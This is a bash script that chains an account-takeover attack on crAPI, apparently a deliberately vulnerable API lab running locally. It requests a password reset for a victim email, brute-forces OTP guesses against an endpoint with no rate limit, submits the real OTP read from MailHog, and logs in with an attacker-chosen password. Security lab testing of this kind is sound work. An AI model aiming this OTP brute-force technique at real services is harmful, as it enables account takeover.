#!/bin/bash
# crAPI Challenge 3: OTP Brute-force Password Reset
# Request reset → brute-force 25+ OTP values on v3 endpoint → succeed with real OTP
BASE="http://localhost:8888"
LOG="test_logs/crapi_chain3_otp.log"
> "$LOG"

echo "=== crAPI Chain: OTP Brute-force Password Reset ===" | tee -a "$LOG"
echo "Started: $(date)" | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Step 1: Request password reset
VICTIM="adam007@example.com"
echo "--- Step 1: Request password reset for $VICTIM ---" | tee -a "$LOG"
curl -s -X POST "$BASE/identity/api/auth/forget-password" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"$VICTIM\"}" | tee -a "$LOG"
echo -e "\n" | tee -a "$LOG"

# Step 2: Get real OTP from MailHog (simulating attacker who has email access,
# but in a real scenario they'd brute-force all 10,000 values)
echo "--- Step 2: Fetch OTP from MailHog ---" | tee -a "$LOG"
sleep 2  # wait for email delivery
REAL_OTP=$(curl -s "http://localhost:8025/api/v2/messages?start=0&limit=5" | \
  python3 -c "
import sys, json
data = json.load(sys.stdin)
for msg in data.get('items', []):
    body = msg.get('Content', {}).get('Body', '')
    if 'otp is:' in body.lower() or 'otp is: ' in body:
        import re
        m = re.search(r'otp is:\s*(\d{4})', body, re.IGNORECASE)
        if m:
            print(m.group(1))
            break
" 2>/dev/null)
echo "Real OTP (from mailhog): $REAL_OTP" | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Step 3: Brute-force OTP on v3 endpoint (no rate limit)
# Try 25 wrong values first, then the correct one
echo "--- Step 3: Brute-force OTP on v3 endpoint (25 wrong + 1 correct) ---" | tee -a "$LOG"
FOUND=0
ATTEMPTS=0
for OTP in 0000 0001 0002 0003 0004 0005 0010 0100 0500 1000 \
           1111 1234 2222 2345 3333 3456 4444 4567 5555 5678 \
           6666 7777 8888 9000 9999; do
  ATTEMPTS=$((ATTEMPTS + 1))
  RESP=$(curl -s -X POST "$BASE/identity/api/auth/v3/check-otp" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$VICTIM\",\"otp\":\"$OTP\",\"password\":\"BruteForced!99\"}")
  STATUS=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('status',0))" 2>/dev/null)
  echo "  Attempt $ATTEMPTS: OTP=$OTP → $STATUS" | tee -a "$LOG"
done
echo "" | tee -a "$LOG"

# Now use the real OTP
echo "--- Step 4: Submit correct OTP ($REAL_OTP) ---" | tee -a "$LOG"
ATTEMPTS=$((ATTEMPTS + 1))
RESP=$(curl -s -X POST "$BASE/identity/api/auth/v3/check-otp" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"$VICTIM\",\"otp\":\"$REAL_OTP\",\"password\":\"BruteForced!99\"}")
echo "  Attempt $ATTEMPTS: OTP=$REAL_OTP → $RESP" | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Step 5: Login as victim with new password
echo "--- Step 5: Login as victim with brute-forced password ---" | tee -a "$LOG"
LOGIN_RESP=$(curl -s -X POST "$BASE/identity/api/auth/login" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"$VICTIM\",\"password\":\"BruteForced!99\"}")
TOKEN=$(echo "$LOGIN_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('token','FAILED')[:50])" 2>/dev/null)
echo "  Login result: token=${TOKEN}..." | tee -a "$LOG"
echo "" | tee -a "$LOG"

echo "Total brute-force attempts: $ATTEMPTS" | tee -a "$LOG"
echo "=== OTP Brute-force Chain Complete ===" | tee -a "$LOG"
echo "Finished: $(date)" | tee -a "$LOG"
